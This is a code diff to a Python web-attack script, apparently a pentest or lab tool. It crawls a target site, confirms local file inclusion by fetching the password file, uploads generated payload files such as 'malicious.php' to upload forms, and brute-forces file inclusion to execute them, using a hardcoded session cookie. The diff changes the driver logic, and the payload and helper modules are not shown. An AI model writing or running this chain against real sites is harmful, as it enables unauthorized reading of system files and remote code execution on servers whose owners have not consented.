@@ -15,7 +15,7 @@ UPLOAD_DIR_WORDLIST = "upload_dir_wordlist.txt"
 WORDLIST = "wordlists/test"
 COOKIE = {"PHPSESSID": "9amrgdojgjebidiqqse4c5jpsr"}
 
-PAYLOAD_FILENAME = "malicious.php"
+# PAYLOAD_FILENAME = "malicious.php"
 REPORT_FILENAME = "vuln_report.txt"
 CONTENT_TYPE_FILE = "content_type.txt"
 
@@ -76,6 +76,14 @@ def generate_report(uploaded_files, failed_files, executed_files):
 def main():
     session = requests.Session()
 
+    # Ask for indicator for LFI
+    success_indicator = input(
+        "Enter the success indicator (e.g., text that appears on success): "
+    )
+    failure_indicator = input(
+        "Enter the failure indicator (e.g., text that indicates failure): "
+    )
+
     # 🔍 Step 1: Crawl for URLs
     found_urls, uploadable_urls = crawler.main_crawl(URL, WORDLIST, COOKIE)
     print("Crawling complete.")
@@ -92,6 +100,13 @@ def main():
     print("\nPotential LFI vulnerabilities:")
     lfi_targets = crawler.check_lfi(found_urls)
 
+    lfi_confirmed_targets = set()
+    for target in lfi_targets:
+        print(target)
+        result = lfi.show_passwd(target, COOKIE)
+        if result:
+            lfi_confirmed_targets.add(target)
+
     # 🔹 Step 2: Generate payloads
     generated_payloads = uploadv2.create_payloads()
 
@@ -103,14 +118,14 @@ def main():
         exit(1)
 
     # 🔹 Step 4: Combine payload lists
-    payload_filenames = PAYLOAD_FILENAMES + generated_payloads
+    # payload_filenames = PAYLOAD_FILENAMES + generated_payloads
 
     # 🔹 Step 5: Try Uploading Each Payload
     uploaded_files = []
     failed_files = []
 
     for url in uploadable_urls:
-        for payload in payload_filenames:
+        for payload in generated_payloads:
             if uploadv2.upload_file(url, payload, COOKIE, CONTENT_TYPE_FILE):
                 print(f"[+] File uploaded successfully: {payload} -> {url}")
                 uploaded_files.append(url + "/" + payload)
@@ -119,7 +134,7 @@ def main():
 
     # 🔹 Step 6: Detect upload directory
     dynamic_upload_dir = uploadv2.get_upload_directory(
-        URL, UPLOAD_DIR_WORDLIST, PAYLOAD_FILENAME, COOKIE
+        URL, UPLOAD_DIR_WORDLIST, uploaded_files, COOKIE
     )
 
     if not uploaded_files:
@@ -131,14 +146,14 @@ def main():
         print(f"[+] Detected Upload Directory: {dynamic_upload_dir}")
     else:
         print("[-] No valid upload directory found. Exiting.")
-        generate_report(uploaded_files, failed_files, [])
-        exit(1)
+        # generate_report(uploaded_files, failed_files, [])
+        # exit(1)
 
     # 🔹 Step 7: Test execution
     executed_files = []
     for target in lfi_targets:
         lfi_found_url = lfi.brute_force_lfi(
-            target, dynamic_upload_dir + PAYLOAD_FILENAME, session, COOKIE
+            target, uploaded_files, success_indicator, failure_indicator, session, COOKIE
         )
         if lfi_found_url:
             print(f"[+] LFI Found at: {lfi_found_url}")
